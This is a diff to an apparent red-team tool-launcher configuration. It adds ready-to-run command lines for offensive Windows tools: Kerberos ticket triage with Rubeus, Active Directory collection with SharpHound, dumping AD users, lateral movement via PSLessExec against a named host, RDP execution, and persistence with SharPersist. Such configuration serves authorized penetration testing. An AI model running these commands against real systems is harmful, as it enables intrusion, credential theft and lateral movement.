@@ -41,10 +41,15 @@ zip_tools:
     location: tools/mimikatz.zip
 
 cs_tools:
+  adhunttool:
+    location: tools/ADHuntTool.exe
+    class: ADHuntTool.Program
+    cmd: DumpAllUsers RingZer0
   winpeas:
     location: tools/winPEASx64.exe
     class: winPEAS.Program
     alt: powersharppack
+    altcmd: PowerSharpPack -winpeas
   efspotato:
     location: EfsPotato.exe
     class: EfsPotato.Program
@@ -59,28 +64,34 @@ cs_tools:
   pslessexec:
     location: tools/PSLessExec.exe
     class: PSLessExec.Program
+    cmd: appsrv01 SensorService notepad.exe
   rubeus:
     location: tools/Rubeus.exe
     class: Rubeus.Program
     cmd: triage
     alt: powersharppack
+    altcmd: PowerSharpPack -rubeus -Command "klist"
   seatbelt:
     location: tools/Seatbelt.exe
     class: Seatbelt.Program
     cmd: -group=system
     alt: powersharppack
+    altcmd: PowerSharpPack -seatbelt -command "-group=system"
   sharpsploit:
     location: tools/SharpSploit.exe
     class: SharpSploit.Program
     alt: powersharppack
+    altcmd: PowerSharpPack -sharpsploit
   spoolsample:
     location: tools/SpoolSample.exe
     class: SpoolSample.Program
     alt: powersharppack
+    altcmd: PowerSharpPack -spoolsample
   sharppersist:
     location: tools/SharpPersist.exe
     class: SharPersist.Program
     alt: powersharppack
+    altcmd: PowerSharpPack -sharppersist
   sqlclient:
     location: tools/SQLClient.exe
     class: SQLClient.Program
@@ -89,7 +100,15 @@ cs_tools:
     class: SharpUp.Program
     cmd: audit
     alt: powersharppack
+    altcmd: PowerSharpPack -sharpup -Command "audit"
+  sharprdp:
+    location: tools/SharpRDP.exe
+    class: SharpRDP.Program
+    alt: powersharppack
+    altcmd: PowerSharpPack -sharprdp
   sharphound:
     location: tools/SharpHound.exe
     class: SharpHound.Program
+    cmd: -d example.com --OutputDirectory C:\windows\tasks
     alt: powersharppack
+    altcmd: PowerSharpPack -sharphound3 -Command "-d example.com --OutputDirectory C:\\windows\\tasks"
